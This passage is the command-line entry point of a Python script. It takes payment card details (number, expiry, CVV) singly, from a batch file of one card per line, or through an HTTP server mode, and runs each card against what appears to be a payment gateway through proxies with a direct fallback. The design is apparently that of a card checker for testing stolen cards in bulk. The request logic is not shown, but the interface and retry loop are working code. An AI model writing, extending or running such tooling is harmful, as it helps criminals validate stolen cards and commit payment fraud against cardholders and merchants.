    p.add_argument("--amount-inr", type=float, default=PLAN_AMOUNT_INR,
                   help=f"INR plan amount (default: {PLAN_AMOUNT_INR})")
    p.add_argument("--pretty", "-p", action="store_true",
                   help="Pretty-print JSON")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="Show stage progress")
    p.add_argument("--quiet", "-q", action="store_true",
                   help="Suppress verbose/error to stderr")
    p.add_argument("--batch", metavar="FILE",
                   help="Batch mode: file with one card per line")
    p.add_argument("--serve", action="store_true",
                   help="HTTP server mode")
    p.add_argument("--host", default="0.0.0.0",
                   help="Server host (default: 0.0.0.0)")
    p.add_argument("--port", type=int, default=8080,
                   help="Server port (default: 8080)")
    args = p.parse_args()

    VERBOSE = args.verbose
    QUIET = args.quiet

    # ─── Batch mode ──────────────────────────────────────────────────
    if args.batch:
        batch_mode(args.batch, args.number, args.proxy, pretty=args.pretty)
        return

    # ─── Serve mode ──────────────────────────────────────────────────
    if args.serve:
        serve_mode(host=args.host, port=args.port)
        return

    # ─── Single mode ─────────────────────────────────────────────────
    card_raw = args.card
    if not card_raw:
        # interactive prompt
        if not QUIET:
            print("Enter card (NUMBER|MM|YY|CVV):", file=sys.stderr, flush=True)
        try:
            card_raw = input().strip()
        except (KeyboardInterrupt, EOFError):
            print(json.dumps({"ok": False, "error": "cancelled"},
                             indent=2 if args.pretty else None))
            sys.exit(1)

    if not card_raw:
        print(json.dumps({"ok": False, "error": "no_card"},
                         indent=2 if args.pretty else None))
        sys.exit(1)

    try:
        card = Card.parse(card_raw)
    except ValueError as e:
        print(json.dumps({"ok": False, "error": "invalid_card", "message": str(e)},
                         indent=2 if args.pretty else None))
        sys.exit(1)

    # ─── Retry with fallback proxy logic ─────────────────────────────
    proxies_to_try = []
    if args.proxy:
        proxies_to_try.append(args.proxy)
    if FALLBACK_TO_DIRECT:
        proxies_to_try.append(None)  # None = direct

    last_result = None
    for i, proxy in enumerate(proxies_to_try, 1):
        label = proxy if proxy else "DIRECT"
        if VERBOSE and not QUIET:
            print(f"   🌐  Attempt {i}/{len(proxies_to_try)} — {label}",
                  file=sys.stderr, flush=True)

        result = run(card, number=args.number, proxy=proxy,
                     amount_inr=args.amount_inr)
        last_result = result

        # If we got a gateway response (not proxy/warm error) — stop retrying
        if result.get("outcome") != "error":
            break
        stage = result.get("stage", "")
        if stage not in ("warm", "lookup", "plans_page", "plans_json"):
            break  # real error at gateway, no point retrying

    # ─── Output ──────────────────────────────────────────────────────
    if args.pretty:
        print(json.dumps(last_result, indent=2, default=str))
    else:
        print(json.dumps(last_result, default=str))


if __name__ == "__main__":
    main()
